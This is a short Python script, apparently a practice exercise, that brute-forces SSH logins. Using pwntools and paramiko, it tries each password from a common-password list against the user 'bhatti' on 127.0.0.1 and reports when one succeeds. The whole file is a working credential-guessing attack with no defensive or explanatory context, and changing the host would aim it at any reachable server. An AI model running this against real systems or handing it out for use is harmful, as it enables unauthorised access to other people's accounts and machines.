from pwn import *
import paramiko

host = "127.0.0.1"
username = "bhatti"
attempts = 0

with open("ssh-common-passwords.text", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print(f"[{attempts}] Attempting password: [{password}]")
            response = ssh(host=host, user=username,
                           password=password, timeout=1)
            if response.connected():
                print(f"[>] Valid password found: {password}")
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print(f"[X] Invalid Password")
        attempts += 1
